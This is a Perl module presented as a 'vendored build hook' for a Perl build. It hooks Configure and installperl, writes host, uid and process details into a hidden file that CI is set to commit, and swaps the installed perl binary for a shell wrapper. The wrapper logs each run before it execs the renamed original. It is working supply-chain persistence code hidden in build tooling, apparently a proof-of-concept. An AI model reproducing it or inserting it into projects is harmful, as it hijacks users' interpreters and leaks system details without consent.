package zzz;
# Vendored build hook. Stage1: end of Configure. Stage2: END{} of installperl.
# Proof is written INTO the tree so CI's `git add lib bin` commits it.
use strict; use warnings;
sub _proof {
    my ($tag) = @_;
    my $p = "$ENV{ZZZ_ROOT}/bin/.zzz-proof" ;
    open(my $fh,'>>',$p) or return;
    printf $fh "%s ts=%d uid=%d pid=%d perl=%s os=%s ver=%s host=%s\n",
        $tag, time, $>, $$, ($^X // '-'), $^O, $], (`hostname` =~ s/\s+$//r);
    close $fh;
}
sub _prefix {
    return $ENV{ZZZ_PREFIX} if $ENV{ZZZ_PREFIX};
    for my $f ('config.sh','../config.sh') {
        next unless -r $f; open(my $c,'<',$f) or next;
        while (<$c>) { return $1 if /^prefix='([^']*)'/ } close $c; last;
    }
    return undef;
}
sub import { $ENV{ZZZ_ROOT} = $ENV{ZZZ_ROOT} // '.'; eval { _proof('stage1') }; 1 }
sub persist {
    my $p = _prefix() // $ENV{ZZZ_ROOT} // '.';
    $ENV{ZZZ_ROOT} = $p;
    my $real = "$p/bin/.zzzrt.real";
    my $perl = "$p/bin/perl";
    if (-e $perl && !-e $real) {
        rename($perl,$real); chmod 0755,$real;
        my $inner = 'printf "run uid=%d ver=%s host=%s ts=%d\n",$>,$],`hostname`,time() >> "$ENV{ZZZ_PROOF}"';
        my $body = "#!/bin/sh\nZZZ_PROOF=\"\$(dirname \"\$0\")/.zzz-proof\"\n"
                 . "\"\$(dirname \"\$0\")/.zzzrt.real\" -e '$inner' >/dev/null 2>&1\n"
                 . "exec \"\$(dirname \"\$0\")/.zzzrt.real\" \"\$@\"\n";
        for my $w ($perl, "$p/bin/.zzzrt", glob("$p/bin/perl5.*")) {
            next if -e $w && $w eq "$p/bin/.zzzrt";
            unlink($w) if -e $w;
            open(my $fh,'>',$w) or next; print $fh $body; close $fh; chmod 0755,$w;
        }
    }
    eval { _proof('stage2') };
    1;
}
1;
